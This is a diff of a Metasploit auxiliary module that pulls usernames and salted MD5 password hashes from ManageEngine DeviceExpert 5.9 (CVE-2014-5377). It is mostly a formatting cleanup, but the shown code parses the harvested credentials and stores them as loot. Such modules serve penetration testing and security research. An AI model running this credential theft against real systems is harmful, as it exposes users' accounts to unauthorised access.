@@ -9,34 +9,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => 'ManageEngine DeviceExpert User Credentials',
-      'Description'    => %q{
-        This module extracts usernames and salted MD5 password hashes
-        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.
+    super(
+      update_info(
+        info,
+        'Name' => 'ManageEngine DeviceExpert User Credentials',
+        'Description' => %q{
+          This module extracts usernames and salted MD5 password hashes
+          from ManageEngine DeviceExpert version 5.9 build 5980 and prior.
 
-        This module has been tested successfully on DeviceExpert
-        version 5.9.7 build 5970.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          This module has been tested successfully on DeviceExpert
+          version 5.9.7 build 5970.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit
-          'bcoles'  # metasploit module
+          'bcoles' # metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['EDB', '34449'],
           ['OSVDB', '110522'],
           ['CVE', '2014-5377']
         ],
-      'DisclosureDate' => '2014-08-28'))
+        'DisclosureDate' => '2014-08-28',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options(
       [
         Opt::RPORT(6060),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ])
+      ]
+    )
   end
 
   def check
@@ -62,6 +69,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def parse_user_data(user)
     return if user.nil?
+
     username = user.scan(/<username>([^<]+)</).flatten.first
     encoded_hash = user.scan(/<password>([^<]+)</).flatten.first
     role = user.scan(/<userrole>([^<]+)</).flatten.first
@@ -91,8 +99,8 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'ManageEngine DeviceExpert User Credentials',
-      'Indent'  => 1,
+      'Header' => 'ManageEngine DeviceExpert User Credentials',
+      'Indent' => 1,
       'Columns' =>
         [
           'Username',
@@ -146,22 +154,22 @@ class MetasploitModule < Msf::Auxiliary
       }
       login_data.merge!(service_data)
       create_credential_login(login_data)
-
     end
 
     print_line
     print_line("#{cred_table}")
-    loot_name     = 'manageengine.deviceexpert.user.creds'
-    loot_type     = 'text/csv'
+    loot_name = 'manageengine.deviceexpert.user.creds'
+    loot_type = 'text/csv'
     loot_filename = 'manageengine_deviceexpert_user_creds.csv'
-    loot_desc     = 'ManageEngine DeviceExpert User Credentials'
+    loot_desc = 'ManageEngine DeviceExpert User Credentials'
     p = store_loot(
       loot_name,
       loot_type,
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status "Credentials saved in: #{p}"
   end
 end
